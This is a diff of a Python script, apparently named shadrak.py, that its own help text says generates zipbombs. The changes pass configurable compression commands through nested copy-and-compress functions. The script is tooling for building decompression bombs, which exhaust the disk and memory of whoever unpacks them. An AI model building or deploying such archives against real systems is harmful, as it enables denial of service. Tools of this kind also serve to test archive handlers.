@@ -63,7 +63,7 @@ def replace(c, i ,o):
     c = c.replace("%out%", o)
     return c
 
-def compress_files(infile, outfile):
+def compress_files(infile, outfile, cmd_multi):
     cmd = replace(cmd_multi, infile, outfile)
     # log.debug("Compression using command: %s" % cmd)
     subprocess.check_output(cmd, shell=True)
@@ -73,16 +73,16 @@ def compress_file(infile, outfile):
     # log.debug("Compression using command: %s" % cmd)
     subprocess.check_output(cmd, shell=True)
 
-def make_copies_and_compress(infile, outfile, n_copies):
+def make_copies_and_compress(infile, outfile, n_copies, cmd):
     gen_files = []
     for i in range(n_copies):
         f_name = '%s-%d.%s' % (get_filename_without_extension(infile),i, ext)
         if not os.path.exists(f_name):
-            generate_dummy_file(infile, 2)
+            generate_dummy_file(infile, size)
         shutil.copy(infile, f_name)
         gen_files.append(f_name)
 
-    compress_files(' '.join(gen_files), outfile)
+    compress_files(' '.join(gen_files), outfile, cmd)
     for f_name in gen_files:
         os.remove(f_name)
 
@@ -102,39 +102,43 @@ def del_files(pattern="^\w+\-\d+.%s"):
         os.remove(i)
     return find
     
-def zipbomb(n_levels, nfile):
+def zipbomb(n_levels, nfile, cmd):
     decompressed_size=1 
     for i in range(1, n_levels+1):
         tmp_in = '%d.%s' % (i, ext)
         tmp_out = '%d.%s' %  (i+1, ext)
-        make_copies_and_compress(tmp_in, tmp_out, nfile)
+        make_copies_and_compress(tmp_in, tmp_out, nfile, cmd)
         decompressed_size *= nfile
         # os.remove(tmp_in)
 
 if __name__ == '__main__':
     # Define arguments
+    def main():
+        del_zip_files()
+        with open("config/compress.yaml", 'r') as f:
+            db = yaml.safe_load(f)
+            if len(sys.argv) > 1:
+                if sys.argv[1] == 'list':
+                    for key, value in db.items():
+                        print(key)
+                    exit()
+            if "single" in db[ext].keys():
+                cmd_single = db[ext]['single']
+                cmd_multi = db[ext]['multi']
+            elif "both" in db[ext].keys():
+                cmd_multi = db[ext]["both"]
 
+        zipbomb(2, 2, cmd_multi)
+
+    size = 2
     if len(sys.argv) > 1:
         ext = sys.argv[1]
+        if ext == "del":
+            del_zip_files(); exit()
     else:
         ext = "lrz"
 
-    del_zip_files()
-
-    with open("config/compress.yaml", 'r') as f:
-        db = yaml.safe_load(f)
-        if len(sys.argv) > 1:
-            if sys.argv[1] == 'list':
-                for key, value in db.items():
-                    print(key)
-                exit()
-        cmd_single = db[ext]['single']
-        cmd_multi = db[ext]['multi']
-
-        print(replace(cmd_single, "test.sh", "brub"))
-
-    zipbomb(2, 2)
-
+    main()
     exit()
     parser = argparse.ArgumentParser(description='Generates zipbombs in various formats.', epilog='Usage example: python3 shadrak.py zip' )
 
@@ -158,8 +162,7 @@ if __name__ == '__main__':
     out = args.out
     conf = args.conf
     size = args.size
-    nfile = args.nfile
-    out_file = '%s.%s' % (out, ext)
+    nfile = args.nfile;out_file = '%s.%s' % (out, ext)
     dummy_name = rand_str(8)
 
     # Read compression command db
